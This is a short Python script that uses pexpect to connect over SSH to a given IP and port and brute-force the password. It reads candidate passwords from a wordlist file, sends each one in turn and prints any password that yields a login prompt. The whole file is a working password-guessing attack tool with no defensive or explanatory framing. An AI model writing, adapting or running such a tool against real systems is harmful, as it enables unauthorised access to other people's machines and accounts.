import pexpect


def connect(ip, port):
    connStr = 'ssh ' + ip + ' -p ' + port
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, pexpect.EOF, \
                        '[P|p]assword:', 'continue connecting'], timeout=10)

    fn = open('/root/Desktop/passFile.txt', 'r')
    # print(ret)

    if ret == 0:
        print('[-] ' + port + ' is not SSH port')
        a = 0  # TIMEOUT
        return a

    elif ret == 1:
        print('[-] ' + port + ' is not SSH port')
        a = 0  # EOF
        return a

    elif ret == 2:
        print("\033[34m" + '[+] ' + port + ' is SSH port! ' + "\033[0m")
        print('-------- PASSWORD ATTACKING -------- ')
        a = 1  # SSH PORT

        for line in fn.readlines():
            child.sendline(line.strip('\n'))
            prom = child.expect([pexpect.EOF, pexpect.TIMEOUT, 'login:'], timeout=7)
            if prom == 2:
                print("\033[31m" + '[+] FIND ! Password : ' + line.strip('\n') + "\033[0m")
                print('-------------------------------------')
                return a
            else:
                print('[-] Password :' + line.strip('\n'))
        print('------------------------------------ ')
        return a

    child.close()
